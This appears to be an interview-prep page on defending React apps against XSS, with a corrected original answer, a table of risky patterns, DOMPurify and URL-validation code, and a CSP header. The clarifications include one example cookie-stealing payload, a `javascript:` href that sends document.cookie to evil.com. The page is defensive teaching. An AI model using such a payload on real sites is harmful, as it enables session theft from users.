## 📄 Original answer (PDF)

**Question:** How do you secure a React application against Cross-Site Scripting (XSS) attacks?

**Answer:** React auto-escapes string variables by default. However, XSS can occur via `dangerouslySetInnerHTML`, insecure `href` attributes (e.g., `javascript:void(0)`), or passing unvalidated props to anchor tags. I enforce strict ESLint rules (`eslint-plugin-react/jsx-no-target-blank`) and sanitize HTML payloads via DOMPurify before rendering.

**Real-time example:** Rendering user-generated markdown comments. Instead of blindly trusting the parsed HTML, it is piped through DOMPurify to strip out malicious ` *(the PDF text is cut off here, presumably "…`<script>` tags and event-handler attributes")*

---

## 💡 Clarifications

- **`jsx-no-target-blank` isn't an XSS rule.** It prevents **reverse tabnabbing**: a page opened with `target="_blank"` could use `window.opener` to redirect your tab to a phishing page. Modern browsers now imply `noopener` for `target="_blank"`, but the rule is still a good habit. For XSS-related linting, use **`react/no-danger`** (flags `dangerouslySetInnerHTML`) and **`react/jsx-no-script-url`** (flags `javascript:` URLs).
- **`javascript:void(0)` is the harmless version.** The real risk is **user-controlled** `href`s like `javascript:fetch('https://evil.com?c='+document.cookie)`. **React 19 blocks `javascript:` URLs** in `href`/`src` (it replaces them with an error-throwing URL), but validate URLs yourself anyway.

---

## 💡 Where XSS gets in

| Hole | Example | Fix |
|---|---|---|
| **`dangerouslySetInnerHTML`** | CMS content, comments, markdown rendered to HTML | **DOMPurify** right before rendering, or render markdown to React elements without raw HTML |
| **User-controlled URLs** | `<a href={user.website}>`, `<iframe src={...}>` | Allow only `http:`/`https:` (and `mailto:`) after parsing with `new URL()` |
| **Direct DOM access** | `ref.current.innerHTML = input`, `insertAdjacentHTML` | Use `textContent`, or sanitise |
| **`eval` / `new Function` / string `setTimeout`** | Dynamic code from data | Never with untrusted input |
| **SSR state injection** | `<script>window.__STATE__ = ${JSON.stringify(state)}</script>` | Escape `<` (`serialize-javascript`), or use the framework's safe serialisation |
| **Third-party scripts** | A compromised analytics or tag script | Subresource Integrity (SRI), a CSP allow-list, minimal third parties |
| **Spreading user props** | `<div {...userControlledProps}>` (e.g. `dangerouslySetInnerHTML` sneaks in) | Pick allowed props explicitly |

---

## 💡 Safe patterns in code

```tsx
// 1. Sanitise HTML before rendering (and sanitise on output, not only on input)
import DOMPurify from 'dompurify'

function Comment({ html }: { html: string }) {
  const clean = useMemo(() => DOMPurify.sanitize(html, { USE_PROFILES: { html: true } }), [html])
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// 1b. Better for markdown: render it to React elements and skip raw HTML entirely
// (react-markdown ignores embedded HTML by default; this site uses it)
<ReactMarkdown>{userMarkdown}</ReactMarkdown>
```

```tsx
// 2. Validate user URLs
function safeUrl(url: string) {
  try {
    const { protocol } = new URL(url, window.location.origin)
    return ['http:', 'https:', 'mailto:'].includes(protocol) ? url : '#'
  } catch {
    return '#'
  }
}

<a href={safeUrl(profile.website)} target="_blank" rel="noopener noreferrer">Website</a>
```

---

## 💡 Defence in depth

**Assume one layer will fail someday:**

| Layer | What it does |
|---|---|
| **React's escaping** | `{value}` is rendered as text, which stops most XSS by default |
| **Sanitisation** (DOMPurify) | Cleans the HTML you must render |
| **Content-Security-Policy** | Even if a script is injected, the browser refuses to run it. Use a nonce-based `script-src`, `object-src 'none'`, `base-uri 'none'`. |
| **Trusted Types** | The browser only accepts sanitised values for `innerHTML` and similar DOM sinks (CSP `require-trusted-types-for 'script'`) |
| **HttpOnly cookies** | An injected script can't **steal** the session token |
| **Input validation** | Reject unexpected formats on the server too |
| **Linting + reviews** | `react/no-danger`, `react/jsx-no-script-url`, review every `dangerouslySetInnerHTML` |
| **Dependency hygiene** | `npm audit`, Renovate, fewer third-party scripts |
| **Security testing** | SAST in CI (Semgrep / CodeQL), DAST scans, pen tests |

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

(See **React & JavaScript → XSS, CSRF & DOMPurify** for CSRF and real-world attacks.)

---

## 🎯 Interview answer

> "React escapes everything rendered through JSX expressions, so the main risks are the escape hatches: `dangerouslySetInnerHTML`, user-controlled URLs in `href` or `src`, direct DOM writes through refs, `eval`-style APIs, and unescaped state injected during server rendering. When I must render user HTML, like CMS content or comments, I sanitise it with DOMPurify right before rendering, or better, render markdown to React elements without allowing raw HTML. User URLs are parsed and restricted to http, https or mailto; React 19 also blocks `javascript:` URLs, but I don't rely on that alone. Lint rules like `react/no-danger` and `react/jsx-no-script-url` flag risky code; the `jsx-no-target-blank` rule in the original answer is actually about reverse tabnabbing rather than XSS. Then I add defence in depth: a nonce-based Content-Security-Policy so injected scripts don't execute, Trusted Types where supported, HttpOnly cookies so tokens can't be stolen, server-side validation, dependency auditing and security scanning in CI."
